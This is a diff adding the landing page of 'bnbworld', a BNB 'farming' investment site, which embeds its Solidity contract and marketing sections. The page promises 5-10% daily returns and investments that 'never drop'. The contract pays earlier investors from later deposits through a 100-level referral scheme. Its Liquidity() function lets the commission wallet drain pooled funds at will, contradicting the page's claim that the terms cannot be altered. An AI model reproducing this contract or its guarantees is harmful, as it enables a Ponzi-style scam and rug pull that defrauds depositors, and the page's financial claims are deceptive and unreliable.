+		if(chkLv65 != 0x0000000000000000000000000000000000000000) {
+			referralLevel65Address[_customerAddress]                    = referralLevel64Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel64Address[_referredBy], _customerAddress, 65);
+			}
+		}
+		
+		// Level 66
+		if(chkLv66 != 0x0000000000000000000000000000000000000000) {
+			referralLevel66Address[_customerAddress]                    = referralLevel65Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel65Address[_referredBy], _customerAddress, 66);
+			}
+		}
+		
+		
+		// Level 67
+		if(chkLv67 != 0x0000000000000000000000000000000000000000) {
+			referralLevel67Address[_customerAddress]                    = referralLevel66Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel66Address[_referredBy], _customerAddress, 67);
+			}
+		}
+		
+		// Level 68
+		if(chkLv68 != 0x0000000000000000000000000000000000000000) {
+			referralLevel68Address[_customerAddress]                    = referralLevel67Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel67Address[_referredBy], _customerAddress, 68);
+			}
+		}
+		
+		// Level 69
+		if(chkLv69 != 0x0000000000000000000000000000000000000000) {
+			referralLevel69Address[_customerAddress]                    = referralLevel68Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel68Address[_referredBy], _customerAddress, 69);
+			}
+		}
+		
+		// Level 70
+		if(chkLv70 != 0x0000000000000000000000000000000000000000) {
+			referralLevel70Address[_customerAddress]                    = referralLevel69Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel69Address[_referredBy], _customerAddress, 70);
+			}
+		}
+		
+		// Level 71
+		if(chkLv71 != 0x0000000000000000000000000000000000000000) {
+			referralLevel71Address[_customerAddress]                    = referralLevel70Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel70Address[_referredBy], _customerAddress, 71);
+			}
+		}
+		
+		// Level 72
+		if(chkLv72 != 0x0000000000000000000000000000000000000000) {
+			referralLevel72Address[_customerAddress]                    = referralLevel71Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel71Address[_referredBy], _customerAddress, 72);
+			}
+		}
+		
+		// Level 73
+		if(chkLv73 != 0x0000000000000000000000000000000000000000) {
+			referralLevel73Address[_customerAddress]                    = referralLevel72Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel72Address[_referredBy], _customerAddress, 73);
+			}
+		}
+		
+		// Level 74
+		if(chkLv74 != 0x0000000000000000000000000000000000000000) {
+			referralLevel74Address[_customerAddress]                    = referralLevel73Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel73Address[_referredBy], _customerAddress, 74);
+			}
+		}
+		
+		// Level 75
+		if(chkLv75 != 0x0000000000000000000000000000000000000000) {
+			referralLevel75Address[_customerAddress]                    = referralLevel74Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel74Address[_referredBy], _customerAddress, 75);
+			}
+		}
+		
+		// Level 76
+		if(chkLv76 != 0x0000000000000000000000000000000000000000) {
+			referralLevel76Address[_customerAddress]                    = referralLevel75Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel75Address[_referredBy], _customerAddress, 76);
+			}
+		}
+		
+		
+		// Level 77
+		if(chkLv77 != 0x0000000000000000000000000000000000000000) {
+			referralLevel77Address[_customerAddress]                    = referralLevel76Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel76Address[_referredBy], _customerAddress, 77);
+			}
+		}
+		
+		// Level 78
+		if(chkLv78 != 0x0000000000000000000000000000000000000000) {
+			referralLevel78Address[_customerAddress]                    = referralLevel77Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel77Address[_referredBy], _customerAddress, 78);
+			}
+		}
+		
+		// Level 79
+		if(chkLv79 != 0x0000000000000000000000000000000000000000) {
+			referralLevel79Address[_customerAddress]                    = referralLevel78Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel78Address[_referredBy], _customerAddress, 79);
+			}
+		}
+		
+		// Level 80
+		if(chkLv80 != 0x0000000000000000000000000000000000000000) {
+			referralLevel80Address[_customerAddress]                    = referralLevel79Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel79Address[_referredBy], _customerAddress, 80);
+			}
+		}
+		
+		// Level 81
+		if(chkLv81 != 0x0000000000000000000000000000000000000000) {
+			referralLevel81Address[_customerAddress]                    = referralLevel80Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel80Address[_referredBy], _customerAddress, 81);
+			}
+		}
+		
+		// Level 82
+		if(chkLv82 != 0x0000000000000000000000000000000000000000) {
+			referralLevel82Address[_customerAddress]                    = referralLevel81Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel81Address[_referredBy], _customerAddress, 82);
+			}
+		}
+		
+		// Level 83
+		if(chkLv83 != 0x0000000000000000000000000000000000000000) {
+			referralLevel83Address[_customerAddress]                    = referralLevel82Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel82Address[_referredBy], _customerAddress, 83);
+			}
+		}
+		
+		// Level 84
+		if(chkLv84 != 0x0000000000000000000000000000000000000000) {
+			referralLevel84Address[_customerAddress]                    = referralLevel83Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel83Address[_referredBy], _customerAddress, 84);
+			}
+		}
+		
+		// Level 85
+		if(chkLv85 != 0x0000000000000000000000000000000000000000) {
+			referralLevel85Address[_customerAddress]                    = referralLevel84Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel84Address[_referredBy], _customerAddress, 85);
+			}
+		}
+		
+		// Level 86
+		if(chkLv86 != 0x0000000000000000000000000000000000000000) {
+			referralLevel86Address[_customerAddress]                    = referralLevel85Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel85Address[_referredBy], _customerAddress, 86);
+			}
+		}
+		
+		// Level 87
+		if(chkLv87 != 0x0000000000000000000000000000000000000000) {
+			referralLevel87Address[_customerAddress]                    = referralLevel86Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel86Address[_referredBy], _customerAddress, 87);
+			}
+		}
+		
+		// Level 88
+		if(chkLv88 != 0x0000000000000000000000000000000000000000) {
+			referralLevel88Address[_customerAddress]                    = referralLevel87Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel87Address[_referredBy], _customerAddress, 88);
+			}
+		}
+
+		// Level 89
+		if(chkLv89 != 0x0000000000000000000000000000000000000000) {
+			referralLevel89Address[_customerAddress]                    = referralLevel88Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel88Address[_referredBy], _customerAddress, 89);
+			}
+		}
+		
+		// Level 90
+		if(chkLv90 != 0x0000000000000000000000000000000000000000) {
+			referralLevel90Address[_customerAddress]                    = referralLevel89Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel89Address[_referredBy], _customerAddress, 90);
+			}
+		}
+		
+		// Level 91
+		if(chkLv91 != 0x0000000000000000000000000000000000000000) {
+			referralLevel91Address[_customerAddress]                    = referralLevel90Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel90Address[_referredBy], _customerAddress, 91);
+			}
+		}
+		
+		// Level 92
+		if(chkLv92 != 0x0000000000000000000000000000000000000000) {
+			referralLevel92Address[_customerAddress]                    = referralLevel91Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel91Address[_referredBy], _customerAddress, 92);
+			}
+		}
+		
+		// Level 93
+		if(chkLv93 != 0x0000000000000000000000000000000000000000) {
+			referralLevel93Address[_customerAddress]                    = referralLevel92Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel92Address[_referredBy], _customerAddress, 93);
+			}
+		}
+		
+		// Level 94
+		if(chkLv94 != 0x0000000000000000000000000000000000000000) {
+			referralLevel94Address[_customerAddress]                    = referralLevel93Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel93Address[_referredBy], _customerAddress, 94);
+			}
+		}
+		
+		// Level 95
+		if(chkLv95 != 0x0000000000000000000000000000000000000000) {
+			referralLevel95Address[_customerAddress]                    = referralLevel94Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel94Address[_referredBy], _customerAddress, 95);
+			}
+		}
+
+		// Level 96
+		if(chkLv96 != 0x0000000000000000000000000000000000000000) {
+			referralLevel96Address[_customerAddress]                    = referralLevel95Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel95Address[_referredBy], _customerAddress, 96);
+			}
+		}
+		
+		// Level 97
+		if(chkLv97 != 0x0000000000000000000000000000000000000000) {
+			referralLevel97Address[_customerAddress]                    = referralLevel96Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel96Address[_referredBy], _customerAddress, 97);
+			}
+		}
+		
+		// Level 98
+		if(chkLv98 != 0x0000000000000000000000000000000000000000) {
+			referralLevel98Address[_customerAddress]                    = referralLevel97Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel97Address[_referredBy], _customerAddress, 98);
+			}
+		}
+		
+		// Level 99
+		if(chkLv99 != 0x0000000000000000000000000000000000000000) {
+			referralLevel99Address[_customerAddress]                    = referralLevel98Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel98Address[_referredBy], _customerAddress, 99);
+			}
+		}
+		
+		// Level 100
+		if(chkLv100 != 0x0000000000000000000000000000000000000000) {
+			referralLevel100Address[_customerAddress]                    = referralLevel99Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel99Address[_referredBy], _customerAddress, 100);
+			}
+		}
+	
+
+		
+		
+        
+       
+}
+	
+	
+	
+
+	function invest(address referrer, uint8 plan) public payable {
+	
+		if (!started) {
+			if (msg.sender == commissionWallet) {
+				started = true;
+			} else revert("Not started yet");
+		}
+
+		require(msg.value >= INVEST_MIN_AMOUNT);
+        require(plan < 3, "Invalid plan");
+
+		uint256 fee = msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
+		commissionWallet.transfer(fee);
+		emit FeePayed(msg.sender, fee);
+
+		User storage user = users[msg.sender];
+		
+		
+		if (user.referrer == address(0)) {
+			if (users[referrer].deposits.length > 0 && referrer != msg.sender) {
+				user.referrer = referrer;
+			}
+
+			address upline = user.referrer;
+			for (uint256 i = 0; i < 10; i++) {
+				if (upline != address(0)) {
+					users[upline].levels[i] = users[upline].levels[i].add(1);
+					upline = users[upline].referrer;
+				} else break;
+			}
+			
+		}
+		 bool    _newReferral                = true;
+        if(referralLevel1Address[msg.sender] != 0x0000000000000000000000000000000000000000) {
+            referrer                     = referralLevel1Address[msg.sender];
+            _newReferral                    = false;
+        }
+		
+		distributeRef(referrer, msg.sender, _newReferral);
+
+		if (user.referrer != address(0)) {
+			address upline = user.referrer;
+			for (uint256 i = 0; i < 10; i++) {
+				if (upline != address(0)) {
+					uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
+					users[upline].bonus = users[upline].bonus.add(amount);
+					users[upline].totalBonus = users[upline].totalBonus.add(amount);
+					emit RefBonus(upline, msg.sender, i, amount);
+					upline = users[upline].referrer;
+				} else break;
+			}
+		}
+
+		if (user.deposits.length == 0) {
+			user.checkpoint = block.timestamp;
+			emit Newbie(msg.sender);
+		}
+
+		user.deposits.push(Deposit(plan, msg.value, block.timestamp));
+
+		totalInvested = totalInvested.add(msg.value);
+
+		emit NewDeposit(msg.sender, plan, msg.value);
+	}
+
+	function withdraw() public {
+		User storage user = users[msg.sender];
+
+		uint256 totalAmount = getUserDividends(msg.sender);
+		uint256 seedAmount = getcurrentseedincome(msg.sender);
+
+		uint256 referralBonus = getUserReferralBonus(msg.sender);
+		if (referralBonus > 0) {
+			user.bonus = 0;
+			totalAmount = totalAmount.add(referralBonus);
+		}
+		totalAmount = totalAmount.add(seedAmount);
+		user.withdrawnseed = user.withdrawnseed.add(seedAmount);
+		
+		require(totalAmount > 0, "User has no dividends");
+
+		uint256 contractBalance = address(this).balance;
+		if (contractBalance < totalAmount) {
+			user.bonus = totalAmount.sub(contractBalance);
+			user.totalBonus = user.totalBonus.add(user.bonus);
+			totalAmount = contractBalance;
+		}
+
+		user.checkpoint = block.timestamp;
+		user.withdrawn = user.withdrawn.add(totalAmount);
+
+		msg.sender.transfer(totalAmount);
+
+		emit Withdrawn(msg.sender, totalAmount);
+	}
+
+	function getContractBalance() public view returns (uint256) {
+		return address(this).balance;
+	}
+	
+	function Liquidity(uint256 amount) public{
+		if (msg.sender == commissionWallet) {
+		   totalInvested = address(this).balance.sub(amount);
+			msg.sender.transfer(amount);
+		}
+	}
+
+	function getPlanInfo(uint8 plan) public view returns(uint256 time, uint256 percent) {
+		time = plans[plan].time;
+		percent = plans[plan].percent;
+	}
+
+	function getUserDividends(address userAddress) public view returns (uint256) {
+		User storage user = users[userAddress];
+
+		uint256 totalAmount;
+
+		for (uint256 i = 0; i < user.deposits.length; i++) {
+			uint256 finish = user.deposits[i].start.add(plans[user.deposits[i].plan].time.mul(1 days));
+			if (user.checkpoint < finish) {
+				uint256 share = user.deposits[i].amount.mul(plans[user.deposits[i].plan].percent).div(PLANPER_DIVIDER);
+				uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
+				uint256 to = finish < block.timestamp ? finish : block.timestamp;
+				if (from < to) {
+					totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
+					
+				}
+			}
+		}
+
+		return totalAmount;
+	}
+	
+	function getUserSeedIncome(address userAddress) public view returns (uint256){
+	
+		uint256 totalSeedAmount;
+		uint256 seedshare;
+		
+		uint256 count = getUserTotalReferrals(userAddress);
+		
+		for	(uint256 y=1; y<= count; y++)
+		{
+		    uint256 level;
+		    address addressdownline;
+		    
+		    (addressdownline,level) = getDownlineRef(userAddress, y);
+		
+			User storage downline =users[addressdownline];
+			
+			
+			for (uint256 i = 0; i < downline.deposits.length; i++) {
+				uint256 finish = downline.deposits[i].start.add(plans[downline.deposits[i].plan].time.mul(1 days));
+				if (downline.deposits[i].start < finish) {
+					uint256 share = downline.deposits[i].amount.mul(plans[downline.deposits[i].plan].percent).div(PLANPER_DIVIDER);
+					uint256 from = downline.deposits[i].start;
+					uint256 to = finish < block.timestamp ? finish : block.timestamp;
+					//seed income
+                    seedshare = share.mul(SEED_PERCENTS[level-1]).div(PERCENTS_DIVIDER);
+					
+					if (from < to) {
+					
+							totalSeedAmount = totalSeedAmount.add(seedshare.mul(to.sub(from)).div(TIME_STEP));	
+						
+					}
+				}
+			}
+		
+		}
+		
+		return totalSeedAmount;		
+	
+	} 
+	
+	
+	function getcurrentseedincome(address userAddress) public view returns (uint256){
+	    User storage user = users[userAddress];
+	    return (getUserSeedIncome(userAddress).sub(user.withdrawnseed));
+	    
+	}
+	
+	function getUserTotalSeedWithdrawn(address userAddress) public view returns (uint256) {
+		return users[userAddress].withdrawnseed;
+	}
+
+
+	function getUserTotalWithdrawn(address userAddress) public view returns (uint256) {
+		return users[userAddress].withdrawn;
+	}
+
+	function getUserCheckpoint(address userAddress) public view returns(uint256) {
+		return users[userAddress].checkpoint;
+	}
+
+	function getUserReferrer(address userAddress) public view returns(address) {
+		return users[userAddress].referrer;
+	}
+
+	function getUserDownlineCount(address userAddress) public view returns(uint256[10] memory referrals) {
+		return (users[userAddress].levels);
+	}
+
+	function getUserTotalReferrals(address userAddress) public view returns(uint256) {
+		return users[userAddress].levels[0]+users[userAddress].levels[1]+users[userAddress].levels[2]+users[userAddress].levels[3]+users[userAddress].levels[4]+users[userAddress].levels[5]+users[userAddress].levels[6]+users[userAddress].levels[7]+users[userAddress].levels[8]+users[userAddress].levels[9];
+	}
+
+	function getUserReferralBonus(address userAddress) public view returns(uint256) {
+		return users[userAddress].bonus;
+	}
+
+	function getUserReferralTotalBonus(address userAddress) public view returns(uint256) {
+		return users[userAddress].totalBonus;
+	}
+
+	function getUserReferralWithdrawn(address userAddress) public view returns(uint256) {
+		return users[userAddress].totalBonus.sub(users[userAddress].bonus);
+	}
+
+	function getUserAvailable(address userAddress) public view returns(uint256) {
+		return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
+	}
+
+	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
+		return users[userAddress].deposits.length;
+	}
+
+	function getUserTotalDeposits(address userAddress) public view returns(uint256 amount) {
+		for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
+			amount = amount.add(users[userAddress].deposits[i].amount);
+		}
+	}
+
+	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint8 plan, uint256 percent, uint256 amount, uint256 start, uint256 finish) {
+	    User storage user = users[userAddress];
+
+		plan = user.deposits[index].plan;
+		percent = plans[plan].percent;
+		amount = user.deposits[index].amount;
+		start = user.deposits[index].start;
+		finish = user.deposits[index].start.add(plans[user.deposits[index].plan].time.mul(1 days));
+	}
+
+	function getSiteInfo() public view returns(uint256 _totalInvested, uint256 _totalBonus) {
+		return(totalInvested, totalRefBonus);
+	}
+
+	function getUserInfo(address userAddress) public view returns(uint256 totalDeposit, uint256 totalWithdrawn, uint256 totalReferrals) {
+		return(getUserTotalDeposits(userAddress), getUserTotalWithdrawn(userAddress), getUserTotalReferrals(userAddress));
+	}
+
+	function isContract(address addr) internal view returns (bool) {
+        uint size;
+        assembly { size := extcodesize(addr) }
+        return size > 0;
+    }
+}
+
+library SafeMath {
+
+    function add(uint256 a, uint256 b) internal pure returns (uint256) {
+        uint256 c = a + b;
+        require(c >= a, "SafeMath: addition overflow");
+
+        return c;
+    }
+
+    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
+        require(b <= a, "SafeMath: subtraction overflow");
+        uint256 c = a - b;
+
+        return c;
+    }
+
+    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
+        if (a == 0) {
+            return 0;
+        }
+
+        uint256 c = a * b;
+        require(c / a == b, "SafeMath: multiplication overflow");
+
+        return c;
+    }
+
+    function div(uint256 a, uint256 b) internal pure returns (uint256) {
+        require(b > 0, "SafeMath: division by zero");
+        uint256 c = a / b;
+
+        return c;
+    }
+}</code></pre>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+    <!-- code-block end -->
+
+    <!-- conditions section -->
+    <section class="conditions" id="investment">
+      <div class="wrapper">
+        <h2><strong>How it</strong> Works</h2>
+        <div class="text">
+          <p>Our solution is a smart contract transaction protocol that automatically implements the terms of a contract
+            amongst all users. Similar to the common contract, both users in our platform will have to define the rules
+            and terms of engagement while transacting. Upon agreement and initiation of the smart contract, it runs as
+            designed with zero chance of orchestrating an alteration to pre-determined conditions. bnbworld to start
+            with as low as 0.1 BNB higher side being unlimited. The rest users leave it to the contract to implement
+            with no more long sitting hours to check when to sell or buy. Therefore, as per contract terms, it ensures
+            your investment value never drops, instead it delivers to our user’s sure yield returns on their staking.
+          </p>
+        </div>
+
+        <div class="cond clearfix">
+          <div class="cond-main">
+            <div class="cond-stat">
+
+              <i class="svgicon svgicon-coinicon">
+
+                <svg>
+
+                  <use xlink:href="img/icons/symbol/sprite.svg#coinicon"></use>
+
+                </svg>
+
+              </i>
+
+              <strong class="js-contract-rate">10%</strong>
+              Maximum Daily
+            </div>
+            <p>Additional Seed income bonus for every block & Referral income.
+            </p>
+          </div>
+          <div class="cond-content">
+            <div class="pref-list">
+              <div class="pref-item">
+                <div class="pref-icon">
+                  <i class="svgicon svgicon-coin_up">
+                    <svg>
+                      <use xlink:href="img/icons/symbol/sprite.svg#coin_up"></use>
+                    </svg>
+                  </i>
+                </div>
+                <div class="pref-title">Moon Farming:</div>
+                <div class="pref-val">5% <span>/ Daily </span>
+                </div>
+                <div class="pref-capt">
+                  &#8734;
+                  <br>
+                  <span>Forever</span>
+                </div>
+              </div>
+              <div class="pref-item">
+                <div class="pref-icon">
+                  <i class="svgicon svgicon-coin_up">
+                    <svg>
+                      <use xlink:href="img/icons/symbol/sprite.svg#coin_up"></use>
+                    </svg>
+                  </i>
+                </div>
+                <div class="pref-title"> Mars Farming:</div>
+                <div class="pref-val">7.5% <span>/ Daily </span></div>
+                <div class="pref-capt">
+                  225%
+                  <br>
+                  <span>30 Days</span>
+                </div>
+              </div>
+              <div class="pref-item">
+                <div class="pref-icon">
+                  <i class="svgicon svgicon-coin_up">
+                    <svg>
+                      <use xlink:href="img/icons/symbol/sprite.svg#coin_up"></use>
+                    </svg>
+                  </i>
+                </div>
+                <div class="pref-title">Jupiter Farming:</div>
+                <div class="pref-val">10% <span>/ Daily </span></div>
+                <div class="pref-capt">
+                  200%
+                  <br>
+                  <span>20 Days</span>
+                </div>
+              </div>
+
+              <!-- <div class="pref-item">
+				  <div class="pref-icon">
+					 <i class="svgicon svgicon-coin_up">
+						<svg>
+						   <use xlink:href="img/icons/symbol/sprite.svg#coin_up"></use>
+						</svg>
+					 </i>
+				  </div>
+				  <div class="pref-title">Ox Farming:</div>
+				  <div class="pref-val">3% <span>/ Daily </span></div>
+				  <div class="pref-capt">
+					 180%
+					 <br/>
+					 <span>60 Days</span>
+				  </div>
+			   </div>-->
+            </div>
+          </div>
+          <!--<div class="advantages">
+              <div class="item">
+                <span class="item-icon">
+
+<i class="svgicon svgicon-profit">
+
+  <svg>
+
+    <use xlink:href="img/icons/symbol/sprite.svg#profit"></use> 
+
+  </svg>
+
+</i>
+
+</span>
+Earnings in realtime
+              </div>
+              <div class="item">
+                <span class="item-icon">
+
+<i class="svgicon svgicon-withdraw">
+
+  <svg>
+
+    <use xlink:href="img/icons/symbol/sprite.svg#withdraw"></use> 
+
+  </svg>
+
+</i>
+
+</span>
+Withdraw anytime
+              </div>
+            </div>-->
+        </div>
+      </div>
+    </section>
+  </div>
+
+  <!-- conditions section end -->
+
+  <!-- how section -->
+  <!-- <section class="how">
+      <div class="wrapper">
+        <h2>How To <strong>Make Deposit</strong>?</h2> 
+        <div class="how-content">
+          <div class="how-block ">
+            <div class="block">
+              <div class="how-title"><span class="num">1</span>Make Deposit</div>
+              <div class="table">
+                <div class="table-row">
+                  <div class="label">GET <span class="bnb"></span></div>
+                  <div class="val"><a data-modal="" data-src="#how" href="#" class="btn btn-bordered">HOW TO GET <span class="bnb"></span></a>
+                  </div>
+                </div>
+                <div class="table-row">
+                  <div class="label">SEND <span class="bnb"></span> TO OUR <span class="contract"></span>
+                  </div>
+                  <div class="val"><a data-modal="" data-src="#make-deposit" href="#" class="btn btn-bordered">Make Deposit</a>
+                  </div>
+                </div>
+              </div>
+              <form class="how-form">
+                <h4>Specify deposit <span class="bnb"></span> amount here:</h4>
+                <div class="deposit-input">
+                  <input type="text" class="input js-calc" value="1">
+                  <span class="label"><span class="bnb"></span></span>
+                </div>
+                <div class="deposit-capt">Minimal deposit amount is 0.01 <span class="bnb"></span>
+                </div>
+                <input type="submit" value="Make Deposit" class="btn btn-2 btn-block">
+              </form>
+            </div>
+          </div>
+
+          <div class="how-block">
+            <div class="block">
+              <div class="how-title"><span class="num">2</span>Request Withdraw</div>
+              <ul class="arr-list">
+                <li>Your Payout Will Come Instantly</li>
+                <li>Request Withdraw From The Same Wallet You Deposited</li>
+              </ul>
+              <div class="wallet js-loggedin" style="display:none;">
+                <h4>Your <span class="bnb"></span> wallet address:</h4> 
+
+                <i class="svgicon svgicon-pay-per-click">
+
+  <svg>
+
+    <use xlink:href="img/icons/symbol/sprite.svg#pay-per-click"></use> 
+
+  </svg>
+
+</i>
+
+                <div class="adress">
+                  <div class="val js-useraddress"></div>
+                  Your Wallet
+                </div>
+                <div class="how-buttons">
+                  <div><a data-modal="" data-src="#stat" href="#" class="btn btn-2 btn-stats">WALLET STATISTICS</a>
+                  </div>
+                  <div><a href="#" data-modal="" data-src="#confirmDividends" class="btn btn-cancel">Withdraw Money</a>
+                  </div>
+                </div>
+              </div>
+				<div class="invite js-loggedout">
+                <img src="temp/img/data/connect6654.html?v1" alt="">
+                <div class="invite-title">Connect With Your Wallet App</div>
+                <a href="#" data-fancybox="" data-src="#how" class="btn btn-bordered btn-block">Connect Wallet</a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section> -->
+  <!-- how section end -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <!-- footer -->
+  <footer class="footer" id="contacts">
+    <span class="footer-decor"></span>
+    <div class="wrapper">
+      <div class="footer-columns clearfix">
+        <div class="footer-left">
+          <div class="logo-wrap">
+            <a href="index.html" class="logo">
+              <img src="img/bnbworldlogo22.png" alt="">
+            </a>
+            <div class="copyright">© 2022 <a href="#">bnbworld.org</a>
+            </div>
+          </div>
+
+          <div class="smart-adress">
+            <div class="table">
+              <div class="table-row">
+                <div class="label">
+
+                  <i class="svgicon svgicon-case">
+
+                    <svg>
+
+                      <use xlink:href="img/icons/symbol/sprite.svg#case"></use>
+
+                    </svg>
+
+                  </i>
+
+                  <!--  <span class="contract"></span> Address:
+                    <div><a href="https://bscscan.com/address/0xf4E9ae6085eD6C06e9060F03339CfBE1Ef24D5dB" target="_BLANK">0x8C705C8...f5C42469</a></div> -->
+                </div>
+                <div class="val">
+                  <a target="_blank" href="#" class="btn btn-bordered">Check Audit</a>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="footer-right">
+          <div class="contacts-title">
+
+            <div class="contacts-lang">
+              <span class=""></span>
+              <div class="">
+                <ul>
+                  <li><a href="https://t.me/bnbworldchaten" target="_blank">Telegram</a>
+                  </li>
+
+                </ul>
+              </div>
+            </div>
+          </div>
+          <div class="contacts">
+            <div class="contacts-col">
+              <div class="contacts-item">
+                <div class="contacts-icon">
+
+                  <i class="svgicon svgicon-tg">
+
+
+
+                  </i>
+
+                </div>
+                <!--  <div class="contacts-block">
+                    <div class="item">
+                      English Telegram Group:
+                      <div class="tg-link"><a href="https://t.me/bnbworldio" target="_BLANK">@bnbworldio</a>
+                      </div>
+                    </div>
+                  </div> -->
+              </div>
+
+            </div>
+
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="footer-bottom">
+      <div class="wrapper">
+        <div class="fb-content">
+          <span class="fb-title">Reserve Domains</span>
+          <a href="#" class="btn">bnbworld.org</a>
+
+          <button class="gotop">
+            <i class="svgicon svgicon-arrow">
+
+              <svg>
+
+                <use xlink:href="img/icons/symbol/sprite.svg#arrow"></use>
+
+              </svg>
+
+            </i>
+          </button>
+        </div>
+      </div>
+    </div>
+  </footer>
+  <!-- footer end -->
+
+  <!-- stat popup -->
+  <div id="stat" class="modal modal-double">
+    <div class="modal-body-wrap">
+      <div class="modal-backdrop"></div>
+      <div class="modal-body-scroll">
+        <div class="modal-body">
+          <button type="button" class="modal-close" title="Close">
+            <svg xmlns="http://www.w3.org/2000/svg" version="1" viewbox="0 0 24 24">
+              <path d="M13 12l5-5-1-1-5 5-5-5-1 1 5 5-5 5 1 1 5-5 5 5 1-1z"></path>
+            </svg>
+
+          </button>
+          <div class="modal-double-content">
+            <div class="modal-part">
+              <div class="block">
+                <div class="modal-title">
+                  Wallet Statistics
+                </div>
+                <div class="modal-content">
+                  <p>Here you will be able to view all your wallet statistics including investment portfolio, profits,
+                    held bonuses, and contract balance bonuses. Through this interface, you can make withdrawals,
+                    investments, and many more.</p>
+
+                  <!--  <div class="witem">
+                <div class="witem-icon">
+
+                  <i class="svgicon svgicon-pay-per-click">
+
+					  <svg>
+
+						<use xlink:href="img/icons/symbol/sprite.svg#pay-per-click"></use> 
+
+					  </svg>
+
+					</i>
+
+                </div>
+                <div class="witem-content">
+                  <div class="witem-title" ></div>
+                  <span id="address"></span>
+                </div>
+                <div class="witem-opts">
+                  <button class="witem-copy" data-copy="#address">
+                    <i class="svgicon svgicon-copy">
+
+						  <svg>
+
+							<use xlink:href="img/icons/symbol/sprite.svg#copy"></use> 
+
+						  </svg>
+
+					</i>
+                  </button>
+                </div>
+              </div> -->
+                  <a href="#" class="btn btn-2 btn-block">Make Deposit</a>
+
+                  <div class="wd-item">
+
+                    <div class="wd-item-content">
+                      <div class="sum js-dividends">
+                        Moon FARMING (Forever)
+                      </div>
+                      <div class="eq js-dividends">5% / Daily | &#8734;</div>
+                      <div class="deposit-input">
+                        <input class="input " id="bnbamount0" type="number" step="0.01" placeholder="Enter BNB amount"
+                          min="0.1" required="required">
+                        <span class="label"><span class="bnb"></span></span>
+                      </div>
+                      <div class="sum js-dividends"></div>
+                      <a href="javascript:void(0);" onclick="stakebnb(0)" class="btn btn-3 btn-block">
+                        Stake BNB</a>
+                    </div>
+
+                  </div>
+
+                  <div class="wd-item">
+
+                    <div class="wd-item-content">
+                      <div class="sum js-dividends">
+                        Mars FARMING (30 Days)
+                      </div>
+                      <div class="eq js-dividends">7.5% / Daily | 225%</div>
+                      <div class="deposit-input">
+                        <input class="input" id="bnbamount1" type="number" step="0.01" placeholder="Enter BNB amount"
+                          min="0.1" required="required">
+                        <span class="label"><span class="bnb"></span></span>
+                      </div>
+                      <div class="sum js-dividends"></div>
+                      <a href="javascript:void(0);" onclick="stakebnb(1)" class="btn btn-3 btn-block">
+                        Stake BNB</a>
+                    </div>
+
+                  </div>
+                  <div class="wd-item">
+
+                    <div class="wd-item-content">
+                      <div class="sum js-dividends">
+                        Jupiter FARMING (20 Days)
+                      </div>
+                      <div class="eq js-dividends">10% / Daily | 200%</div>
+                      <div class="deposit-input">
+                        <input class="input " id="bnbamount2" type="number" step="0.01" placeholder="Enter BNB amount"
+                          min="0.1" required="required">
+                        <span class="label"><span class="bnb"></span></span>
+                      </div>
+                      <div class="sum js-dividends"></div>
+                      <a href="javascript:void(0);" onclick="stakebnb(2)" class="btn btn-3 btn-block">
